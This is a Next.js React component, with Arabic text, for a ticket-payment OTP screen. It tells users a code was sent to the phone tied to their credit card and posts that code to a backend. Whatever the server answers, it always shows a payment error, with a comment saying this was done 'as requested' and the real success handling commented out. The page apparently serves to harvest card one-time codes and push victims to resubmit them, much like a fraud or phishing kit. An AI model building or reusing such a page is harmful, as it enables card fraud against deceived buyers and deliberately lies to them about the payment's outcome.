'use client';
import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';

const PaymentSuccess = ({ orderData, onClose }) => {
    const router = useRouter();
    const [countdown, setCountdown] = useState(600); // 10 minutes in seconds
    const [otp, setOtp] = useState('');
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');
    const [showSuccess, setShowSuccess] = useState(false);

    useEffect(() => {
        const timer = setInterval(() => {
            setCountdown(prev => {
                if (prev <= 1) {
                    // Auto redirect when countdown reaches 0
                    handleTimeout();
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);

        return () => clearInterval(timer);
    }, []);

    const handleTimeout = () => {
        // Clear localStorage and redirect on timeout
        localStorage.removeItem('selectedSeats');
        localStorage.removeItem('userData');
        localStorage.removeItem('userSession');
        localStorage.removeItem('orderStep');
        localStorage.removeItem('eventData');
        
        alert('انتهت صلاحية رمز التحقق. يرجى المحاولة مرة أخرى.');
        router.push('/');
    };

    const handleRedirect = () => {
        // Clear localStorage and redirect
        localStorage.removeItem('selectedSeats');
        localStorage.removeItem('userData');
        localStorage.removeItem('userSession');
        localStorage.removeItem('orderStep');
        localStorage.removeItem('eventData');
        
        router.push('/');
    };

    const handleOtpSubmit = async (e) => {
        e.preventDefault();
        
        if (!otp || otp.length < 4) {
            setError('يرجى إدخال رمز التحقق');
            return;
        }

        setLoading(true);
        setError('');

        try {
            const response = await fetch('/api/payment/verify-otp', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    orderId: orderData.orderId,
                    otp: otp.trim()
                })
            });

            const data = await response.json();

            // Always show error after OTP submission (as requested)
            setError('حدث خطأ غير متوقع أثناء معالجة الدفع. يرجى المحاولة مرة أخرى أو التواصل مع خدمة العملاء.');
            
            // Note: In real implementation, you would handle success/failure based on data.success
            // if (data.success) {
            //     setShowSuccess(true);
            //     setTimeout(() => {
            //         handleRedirect();
            //     }, 3000);
            // } else {
            //     setError(data.error || 'رمز التحقق غير صحيح');
            // }
        } catch (err) {
            setError('حدث خطأ أثناء التحقق. يرجى المحاولة مرة أخرى.');
        } finally {
            setLoading(false);
        }
    };

    const formatTime = (seconds) => {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
    };

    // Show success message after OTP verification
    if (showSuccess) {
        return (
            <div className="payment-success-overlay">
                <div className="payment-success-container">
                    <div className="payment-success-content">
                        {/* Success Icon */}
                        <div className="success-icon">
                            <svg width="80" height="80" viewBox="0 0 80 80" fill="none">
                                <circle cx="40" cy="40" r="40" fill="#10B981"/>
                                <path 
                                    d="M25 40L35 50L55 30" 
                                    stroke="white" 
                                    strokeWidth="4" 
                                    strokeLinecap="round" 
                                    strokeLinejoin="round"
                                />
                            </svg>
                        </div>

                        {/* Success Message */}
                        <h1 className="success-title">تم الدفع بنجاح!</h1>
                        <p className="success-subtitle">شكراً لك على شراء التذاكر</p>

                        {/* Order Details */}
                        <div className="order-details">
                            <div className="order-detail-item">
                                <span className="detail-label">رقم الطلب:</span>
                                <span className="detail-value">{orderData.orderId}</span>
                            </div>
                            <div className="order-detail-item">
                                <span className="detail-label">المبلغ المدفوع:</span>
                                <span className="detail-value">{orderData.total.toLocaleString()} {orderData.currency}</span>
                            </div>
                            <div className="order-detail-item">
                                <span className="detail-label">حالة الطلب:</span>
                                <span className="detail-value status-completed">مكتمل</span>
                            </div>
                        </div>

                        {/* Additional Info */}
                        <div className="success-info">
                            <div className="info-item">
                                <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                                    <path 
                                        d="M10 18C14.4183 18 18 14.4183 18 10C18 5.58172 14.4183 2 10 2C5.58172 2 2 5.58172 2 10C2 14.4183 5.58172 18 10 18Z" 
                                        stroke="#6B7280" 
                                        strokeWidth="2"
                                    />
                                    <path 
                                        d="M10 6V10L13 13" 
                                        stroke="#6B7280" 
                                        strokeWidth="2" 
                                        strokeLinecap="round" 
                                        strokeLinejoin="round"
                                    />
                                </svg>
                                <span>ستصلك التذاكر على بريدك الإلكتروني خلال 48 ساعة من موعد الحدث</span>
                            </div>
                            <div className="info-item">
                                <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                                    <path 
                                        d="M3 8L10 13L17 8M3 8L10 3L17 8M3 8V16L10 21L17 16V8" 
                                        stroke="#6B7280" 
                                        strokeWidth="2" 
                                        strokeLinecap="round" 
                                        strokeLinejoin="round"
                                    />
                                </svg>
                                <span>احتفظ برقم الطلب للمراجعة أو الاستفسارات</span>
                            </div>
                        </div>

                        {/* Actions */}
                        <div className="success-actions">
                            <button 
                                className="btn-primary"
                                onClick={handleRedirect}
                            >
                                العودة للصفحة الرئيسية
                            </button>
                            <div className="auto-redirect">
                                سيتم التوجه تلقائياً خلال 3 ثوانٍ
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        );
    }

    return (
        <div className="payment-success-overlay">
            <div className="payment-success-container">
                <div className="payment-success-content">
                    {/* OTP Icon */}
                    <div className="otp-icon">
                        <svg width="80" height="80" viewBox="0 0 80 80" fill="none">
                            <circle cx="40" cy="40" r="40" fill="#3B82F6"/>
                            <path 
                                d="M30 35H50M30 45H50M35 25H45C47.2091 25 49 26.7909 49 29V51C49 53.2091 47.2091 55 45 55H35C32.7909 55 31 53.2091 31 51V29C31 26.7909 32.7909 25 35 25Z" 
                                stroke="white" 
                                strokeWidth="3" 
                                strokeLinecap="round" 
                                strokeLinejoin="round"
                            />
                        </svg>
                    </div>

                    {/* OTP Message */}
                    <h1 className="otp-title">تم إرسال رمز التحقق</h1>
                    <p className="otp-subtitle">تم إرسال رمز التحقق إلى هاتفك المرتبط بالبطاقة الائتمانية</p>

                    {/* Order Info */}
                    <div className="order-details">
                        <div className="order-detail-item">
                            <span className="detail-label">رقم الطلب:</span>
                            <span className="detail-value">{orderData.orderId}</span>
                        </div>
                        <div className="order-detail-item">
                            <span className="detail-label">المبلغ:</span>
                            <span className="detail-value">{orderData.total.toLocaleString()} {orderData.currency}</span>
                        </div>
                    </div>

                    {/* OTP Form */}
                    <form onSubmit={handleOtpSubmit} className="otp-form">
                        <div className="otp-input-container">
                            <label className="otp-label">أدخل رمز التحقق</label>
                            <input
                                type="text"
                                value={otp}
                                onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
                                placeholder="123456"
                                className="otp-input"
                                maxLength="6"
                                disabled={loading}
                                autoFocus
                            />
                            {error && (
                                <div className="error-message">
                                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                                        <path 
                                            d="M8 15C11.866 15 15 11.866 15 8C15 4.13401 11.866 1 8 1C4.13401 1 1 4.13401 1 8C1 11.866 4.13401 15 8 15Z" 
                                            stroke="#EF4444" 
                                            strokeWidth="1.5"
                                        />
                                        <path 
                                            d="M8 5V8M8 11H8.01" 
                                            stroke="#EF4444" 
                                            strokeWidth="1.5" 
                                            strokeLinecap="round"
                                        />
                                    </svg>
                                    {error}
                                </div>
                            )}
                        </div>

                        <button 
                            type="submit" 
                            className="btn-primary"
                            disabled={loading || !otp || otp.length < 4}
                        >
                            {loading ? (
                                <>
                                    <div className="loading-spinner"></div>
                                    جاري التحقق...
                                </>
                            ) : (
                                'تأكيد الدفع'
                            )}
                        </button>
                    </form>

                    {/* Timer and Info */}
                    <div className="otp-info">
                        <div className="timer-container">
                            <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                                <path 
                                    d="M10 18C14.4183 18 18 14.4183 18 10C18 5.58172 14.4183 2 10 2C5.58172 2 2 5.58172 2 10C2 14.4183 5.58172 18 10 18Z" 
                                    stroke="#6B7280" 
                                    strokeWidth="2"
                                />
                                <path 
                                    d="M10 6V10L13 13" 
                                    stroke="#6B7280" 
                                    strokeWidth="2" 
                                    strokeLinecap="round" 
                                    strokeLinejoin="round"
                                />
                            </svg>
                            <span>
                                الوقت المتبقي: <strong>{formatTime(countdown)}</strong>
                            </span>
                        </div>
                        <div className="info-item">
                            <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                                <path 
                                    d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92z" 
                                    stroke="#F59E0B" 
                                    strokeWidth="2"
                                />
                                <path 
                                    d="M10 7v4M10 15h.01" 
                                    stroke="#F59E0B" 
                                    strokeWidth="2" 
                                    strokeLinecap="round"
                                />
                            </svg>
                            <span>قد يستغرق وصول الرمز حتى 10 دقائق</span>
                        </div>
                    </div>
                </div>
            </div>

            <style jsx>{`
                .payment-success-overlay {
                    position: fixed;
                    top: 0;
                    left: 0;
                    right: 0;
                    bottom: 0;
                    background: rgba(0, 0, 0, 0.8);
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    z-index: 9999;
                    padding: 20px;
                }

                .payment-success-container {
                    background: white;
                    border-radius: 20px;
                    box-shadow: 0 25px 50px rgba(0, 0, 0, 0.25);
                    max-width: 500px;
                    width: 100%;
                    max-height: 90vh;
                    overflow-y: auto;
                    animation: successSlideIn 0.5s ease-out;
                }

                @keyframes successSlideIn {
                    from {
                        opacity: 0;
                        transform: translateY(-50px) scale(0.9);
                    }
                    to {
                        opacity: 1;
                        transform: translateY(0) scale(1);
                    }
                }

                .payment-success-content {
                    padding: 40px 30px;
                    text-align: center;
                }

                .success-icon, .otp-icon {
                    margin-bottom: 30px;
                    animation: successBounce 0.6s ease-out 0.2s both;
                }

                @keyframes successBounce {
                    from {
                        opacity: 0;
                        transform: scale(0);
                    }
                    50% {
                        transform: scale(1.1);
                    }
                    to {
                        opacity: 1;
                        transform: scale(1);
                    }
                }

                .success-title, .otp-title {
                    font-size: 28px;
                    font-weight: bold;
                    margin: 0 0 10px 0;
                    animation: fadeInUp 0.5s ease-out 0.3s both;
                }

                .success-title {
                    color: #10B981;
                }

                .otp-title {
                    color: #3B82F6;
                }

                .success-subtitle, .otp-subtitle {
                    font-size: 16px;
                    color: #6B7280;
                    margin: 0 0 30px 0;
                    animation: fadeInUp 0.5s ease-out 0.4s both;
                }

                @keyframes fadeInUp {
                    from {
                        opacity: 0;
                        transform: translateY(20px);
                    }
                    to {
                        opacity: 1;
                        transform: translateY(0);
                    }
                }

                .order-details {
                    background: #F9FAFB;
                    border-radius: 12px;
                    padding: 20px;
                    margin: 0 0 30px 0;
                    animation: fadeInUp 0.5s ease-out 0.5s both;
                }

                .order-detail-item {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 12px;
                }

                .order-detail-item:last-child {
                    margin-bottom: 0;
                }

                .detail-label {
                    font-size: 14px;
                    color: #6B7280;
                    font-weight: 500;
                }

                .detail-value {
                    font-size: 14px;
                    color: #111827;
                    font-weight: 600;
                    text-align: left;
                }

                .status-completed {
                    color: #10B981;
                }

                .success-info, .otp-info {
                    text-align: right;
                    margin: 0 0 30px 0;
                    animation: fadeInUp 0.5s ease-out 0.6s both;
                }

                .otp-form {
                    margin: 0 0 30px 0;
                    animation: fadeInUp 0.5s ease-out 0.5s both;
                }

                .otp-input-container {
                    margin-bottom: 20px;
                }

                .otp-label {
                    display: block;
                    font-size: 14px;
                    font-weight: 600;
                    color: #374151;
                    margin-bottom: 8px;
                    text-align: right;
                }

                .otp-input {
                    width: 100%;
                    padding: 15px;
                    border: 2px solid #E5E7EB;
                    border-radius: 12px;
                    font-size: 18px;
                    font-weight: 600;
                    text-align: center;
                    letter-spacing: 0.5em;
                    transition: all 0.2s ease;
                    background: #F9FAFB;
                }

                .otp-input:focus {
                    outline: none;
                    border-color: #3B82F6;
                    background: white;
                    box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
                }

                .otp-input:disabled {
                    background: #F3F4F6;
                    color: #9CA3AF;
                    cursor: not-allowed;
                }

                .error-message {
                    display: flex;
                    align-items: center;
                    gap: 8px;
                    margin-top: 8px;
                    padding: 8px 12px;
                    background: #FEF2F2;
                    border: 1px solid #FECACA;
                    border-radius: 8px;
                    color: #DC2626;
                    font-size: 14px;
                    text-align: right;
                }

                .timer-container {
                    display: flex;
                    align-items: center;
                    gap: 8px;
                    margin-bottom: 16px;
                    font-size: 14px;
                    color: #6B7280;
                    padding: 12px;
                    background: #F3F4F6;
                    border-radius: 8px;
                    text-align: center;
                }

                .loading-spinner {
                    width: 16px;
                    height: 16px;
                    border: 2px solid transparent;
                    border-top: 2px solid white;
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                    margin-left: 8px;
                }

                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }

                .info-item {
                    display: flex;
                    align-items: flex-start;
                    gap: 12px;
                    margin-bottom: 16px;
                    font-size: 14px;
                    color: #6B7280;
                    line-height: 1.5;
                }

                .info-item:last-child {
                    margin-bottom: 0;
                }

                .success-actions {
                    animation: fadeInUp 0.5s ease-out 0.7s both;
                }

                .btn-primary {
                    background: #3B82F6;
                    color: white;
                    border: none;
                    border-radius: 12px;
                    padding: 15px 30px;
                    font-size: 16px;
                    font-weight: 600;
                    cursor: pointer;
                    transition: all 0.2s ease;
                    width: 100%;
                    margin-bottom: 15px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                }

                .btn-primary:hover:not(:disabled) {
                    background: #2563EB;
                    transform: translateY(-1px);
                }

                .btn-primary:active:not(:disabled) {
                    transform: translateY(0);
                }

                .btn-primary:disabled {
                    background: #9CA3AF;
                    cursor: not-allowed;
                    transform: none;
                }

                .auto-redirect {
                    font-size: 14px;
                    color: #6B7280;
                    animation: pulse 2s infinite;
                }

                @keyframes pulse {
                    0%, 100% {
                        opacity: 1;
                    }
                    50% {
                        opacity: 0.5;
                    }
                }

                @media (max-width: 768px) {
                    .payment-success-overlay {
                        padding: 15px;
                    }

                    .payment-success-content {
                        padding: 30px 20px;
                    }

                    .success-title {
                        font-size: 24px;
                    }

                    .order-details {
                        padding: 15px;
                    }

                    .info-item {
                        font-size: 13px;
                    }
                }
            `}</style>
        </div>
    );
};

export default PaymentSuccess; 